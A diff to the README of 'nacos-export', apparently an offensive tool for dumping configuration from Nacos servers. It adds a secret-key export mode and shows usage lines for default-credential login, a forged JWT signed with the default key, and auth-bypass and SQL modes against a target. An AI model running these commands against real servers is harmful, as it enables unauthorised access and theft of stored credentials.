@@ -1,6 +1,7 @@
 # NACOS EXPORT
 
 - ✅ 通过nacos账号密码导出配置
+- ✅ 通过secretkey导出配置
 - ✅ 通过token导出配置
 - ✅ 通过unauth/bypass导出配置
 - ✅ 导出配置数量统计
@@ -17,7 +18,7 @@ $ python3 nacos-export.py
 
  ______________
 < Nacos Export >         @Author: Arm!tage
- --------------          @Version: v1.1.1
+ --------------          @Version: v1.2.0
         \   ^__^
          \  (oo)\_______
             (__)\       )\/\
@@ -26,13 +27,15 @@ $ python3 nacos-export.py
 
 Usage:
     python3 nacos-export.py <URL> <USERNAME> <PASSWORD>
+    python3 nacos-export.py <URL> secertkey <SECRETKEY>
     python3 nacos-export.py <URL> <TOKEN>
     python3 nacos-export.py <URL> bypass|unauth
     python3 nacos-export.py <URL> sql
 
 Example:
     python3 nacos-export.py http://TARGET:8848/nacos nacos nacos
-    python3 nacos-export.py http://TARGET:8848/nacos eyJhbGciOiJIXXXXXXXXXXXX
+    python3 nacos-export.py http://TARGET:8848/nacos secretkey SecretKey012345678901234567890123456789012345678901234567890123456789
+    python3 nacos-export.py http://TARGET:8848/nacos eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
     python3 nacos-export.py http://TARGET:8848/nacos unauth
     python3 nacos-export.py http://TARGET:8848/nacos sql
 ```
